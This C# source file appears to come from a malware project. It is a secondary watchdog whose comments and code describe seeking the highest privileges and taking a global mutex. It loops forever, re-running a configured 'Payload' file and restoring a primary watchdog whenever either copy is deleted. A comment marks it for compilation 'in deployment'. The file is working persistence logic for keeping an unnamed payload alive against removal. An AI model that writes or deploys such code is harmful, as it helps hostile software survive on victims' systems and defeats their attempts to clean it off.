
//THIS FILE IS TO BE COMPILED SEPERATELY IN DEPLOYMENT
/*

This secondary watchdog monitors the main watchdog. It verifies if it running. 
\
If not running, it verifies the existence of the file then runs it.

if doesnt exist, it takes from another copy of the watchdog, copies it to the orig location, then runs it
if the secondary location of the primary watchdog gets removed, the secondary watchdog copies it back again


*/
using System.Diagnostics;

namespace MonitorWatchdog
{
    public class MonitorWatchdog
    {
        static void Main(string[] args)
        {
            using (Mutex mutex = new Mutex(false, "Global\\" + Config.SecondaryWatchdogMutexName, out bool isNewInstance))
            {
                watchdogHelper.EnsureHighestPriv(isNewInstance);

                WatchdogLogic();
            }
        }



        static void WatchdogLogic()
        {
            //  loop for frequent checks
            int SecondarySleep = Config.sleepTime + 5000;
            while (true)
            {

                watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
                watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
                watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);

                watchdogHelper.VerifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
                watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);

                watchdogHelper.VerifyFilePathsSourceAndDest(Config.PrimaryWatchdogPath, Config.PrimaryWatchdogName);
                watchdogHelper.CheckAndRunWatchdog(Config.PrimaryWatchdogPath, Config.PrimaryWatchdogName, Config.PrimaryWatchdogMutexName);


                Thread.Sleep(SecondarySleep);
            }
        }

    }
}